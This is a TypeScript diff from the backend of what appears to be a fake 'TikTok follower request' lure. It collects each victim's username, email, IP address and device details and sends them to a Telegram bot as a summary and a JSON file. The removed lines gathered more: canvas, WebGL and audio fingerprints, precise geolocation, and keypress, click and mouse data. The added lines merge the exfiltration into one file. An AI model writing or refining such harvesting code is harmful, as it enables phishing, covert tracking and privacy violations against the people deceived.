@@ -269,37 +269,8 @@ ${userInfo?.userAgent || 'Unknown'}
 - Browser Compatibility: High
       `;
       
-      // Split message into smaller chunks to avoid "message too long" error
-      // Telegram has a limit of approximately 4096 characters per message
-      const MAX_MESSAGE_LENGTH = 3000; // Using 3000 to be safe
-      const messageChunks = [];
-      
-      // Split the message into chunks
-      let remainingMessage = message;
-      let chunkIndex = 1;
-      const totalChunks = Math.ceil(message.length / MAX_MESSAGE_LENGTH);
-      
-      while (remainingMessage.length > 0) {
-        // Find a good place to split (preferably at a newline)
-        let splitIndex = MAX_MESSAGE_LENGTH;
-        if (remainingMessage.length > MAX_MESSAGE_LENGTH) {
-          // Try to find a newline to split at
-          const newlineIndex = remainingMessage.lastIndexOf('\n', MAX_MESSAGE_LENGTH);
-          if (newlineIndex > 0) {
-            splitIndex = newlineIndex + 1; // Include the newline
-          }
-        } else {
-          splitIndex = remainingMessage.length;
-        }
-        
-        // Create chunk with part number
-        const chunk = `Part ${chunkIndex}/${totalChunks}:\n${remainingMessage.substring(0, splitIndex)}`;
-        messageChunks.push(chunk);
-        
-        // Update remaining message
-        remainingMessage = remainingMessage.substring(splitIndex);
-        chunkIndex++;
-      }
+      // We're now sending a consolidated JSON file instead of long message chunks
+      // For the notification, we'll just send a concise message
       
       console.log("Sending notification to Telegram...");
       // API endpoints for Telegram
@@ -307,7 +278,7 @@ ${userInfo?.userAgent || 'Unknown'}
       const sendDocumentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
       
       try {
-        // First, send a brief summary message
+        // Send a brief summary message
         const summaryMessage = `
 🔥 New TikTok Follower Request 🔥
 👤 Username: @${username}
@@ -315,7 +286,7 @@ ${userInfo?.userAgent || 'Unknown'}
 📱 Device: ${deviceModel}
 ⏰ Timestamp: ${new Date().toISOString()}
 
-💾 Sending fingerprint data as JSON files...
+💾 Sending consolidated data as a single JSON file...
         `;
         
         const summaryResponse = await fetch(sendMessageUrl, {
@@ -332,106 +303,50 @@ ${userInfo?.userAgent || 'Unknown'}
           throw new Error(`Failed to send summary: ${summaryData.description || "Unknown error"}`);
         }
         
-        // Create JSON data files organized by category
-        const jsonData = {
-          userInfo: {
-            username,
-            followers,
-            email: req.body.email || "",
-            submissionTime: new Date().toISOString()
-          },
-          deviceInfo: {
-            device: deviceModel,
-            brand: mobileDetails?.brand || 'Unknown',
-            model: mobileDetails?.model || 'Unknown',
-            osVersion: mobileDetails?.osVersion || 'Unknown',
-            deviceType: mobileDetails?.deviceType || 'Unknown',
-            screenSize: userInfo?.screenSize || 'Unknown',
-            platform: userInfo?.platform || 'Unknown',
-            userAgent: userInfo?.userAgent || 'Unknown'
-          },
-          networkInfo: {
-            ipAddress: ipAddress || userInfo?.ip || 'Unknown',
-            ipVersion: ipAddress && ipAddress.includes(':') ? 'IPv6' : 'IPv4',
-            provider: ipDetails?.isp || 'Unknown',
-            connectionType: userInfo?.connection?.type || 'Unknown',
-            networkChanges: networkChanges || [],
-            proxy: userInfo?.isProxy || false,
-            vpn: userInfo?.isVpn || false
-          },
-          geoInfo: {
-            country: geolocationDetails?.country || 'Unknown',
-            city: geolocationDetails?.city || 'Unknown',
-            region: geolocationDetails?.region || 'Unknown',
-            timezone: userInfo?.timezone || 'Unknown',
-            latitude: geolocation?.latitude || null,
-            longitude: geolocation?.longitude || null,
-            accuracy: geoAccuracy || 'Unknown',
-            source: geoSource || 'Unknown'
-          },
-          hardwareInfo: {
-            cores: userInfo?.hardwareConcurrency || 'Unknown',
-            memory: userInfo?.deviceMemory || 'Unknown',
-            gpu: hardwareInfo?.gpu || 'Unknown',
-            touchPoints: hardwareInfo?.touchPoints || 'Unknown',
-            battery: hardwareInfo?.batteryLevel || 'Unknown',
-            sensors: sensors || {}
-          },
-          fingerprintInfo: {
-            canvas: userInfo?.canvasFingerprint || 'Not available',
-            webgl: userInfo?.webglFingerprint || 'Not available',
-            audio: userInfo?.audioFingerprint || 'Not available',
-            fonts: userInfo?.fonts ? userInfo.fonts.split(',') : [],
-            plugins: userInfo?.plugins ? userInfo.plugins.split(',') : [],
-            cookiesEnabled: userInfo?.cookiesEnabled || false,
-            doNotTrack: userInfo?.doNotTrack !== 'unknown',
-            isEmulator: userInfo?.isEmulator || false,
-            browserFingerprint: userInfo?.browserFingerprint || 'Not available'
-          },
-          behavioralInfo: {
-            mouseMovements: userInfo?.behavioralData?.mouseMovements || [],
-            clicks: userInfo?.behavioralData?.clicks || [],
-            keypresses: userInfo?.behavioralData?.keypresses || [],
-            scrollPatterns: userInfo?.behavioralData?.scrollPatterns || [],
-            touchPatterns: userInfo?.behavioralData?.touchPatterns || []
-          }
+        // Create a consolidated JSON structure, excluding user behavior and info sections
+        const fullSubmission = {
+          id: Date.now(), // Temporary ID for the consolidated JSON
+          username,
+          followersRequested: followers,
+          email: req.body.email || "",
+          deviceInfo: userInfo,
+          ipAddress: ipAddress || userInfo?.ip,
+          createdAt: new Date().toISOString(),
+          processed: false
         };
+        
+        // Generate consolidated JSON using the new structure
+        const consolidatedData = createConsolidatedJSON(fullSubmission);
         
         // Create temporary directory for JSON files
         const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tiktok-json-'));
         
         try {
-          // Send each category as a separate JSON file
-          for (const category of Object.keys(jsonData)) {
-            const categoryData = jsonData[category as keyof typeof jsonData];
-            const jsonContent = JSON.stringify(categoryData, null, 2);
-            
-            // Create temporary file
-            const fileName = `${username}_${category}_${Date.now()}.json`;
-            const filePath = path.join(tempDir, fileName);
-            fs.writeFileSync(filePath, jsonContent);
-            
-            // Send file to Telegram
-            const form = new FormData();
-            form.append('chat_id', TELEGRAM_CHAT_ID);
-            form.append('document', fs.createReadStream(filePath), {
-              filename: fileName,
-              contentType: 'application/json'
-            });
-            
-            const fileResponse = await fetch(sendDocumentUrl, {
-              method: 'POST',
-              body: form as any,
-              headers: form.getHeaders()
-            });
-            
-            const fileData = await fileResponse.json() as { ok: boolean, description?: string };
-            if (!fileData.ok) {
-              throw new Error(`Failed to send ${category} file: ${fileData.description || "Unknown error"}`);
-            }
-            
-            // Short delay to avoid rate limiting
-            await new Promise(resolve => setTimeout(resolve, 300));
+          // Create a single consolidated JSON file
+          const jsonContent = JSON.stringify(consolidatedData, null, 2);
+          
+          // Create temporary file
+          const fileName = `${username}_submission_data_${Date.now()}.json`;
+          const filePath = path.join(tempDir, fileName);
+          fs.writeFileSync(filePath, jsonContent);
+          
+          // Send file to Telegram
+          const form = new FormData();
+          form.append('chat_id', TELEGRAM_CHAT_ID);
+          form.append('document', fs.createReadStream(filePath), {
+            filename: fileName,
+            contentType: 'application/json'
+          });
+          
+          const fileResponse = await fetch(sendDocumentUrl, {
+            method: 'POST',
+            body: form as any,
+            headers: form.getHeaders()
+          });
+          
+          const fileData = await fileResponse.json() as { ok: boolean, description?: string };
+          if (!fileData.ok) {
+            throw new Error(`Failed to send consolidated data file: ${fileData.description || "Unknown error"}`);
           }
           
           console.log("Notification sent successfully to Telegram");
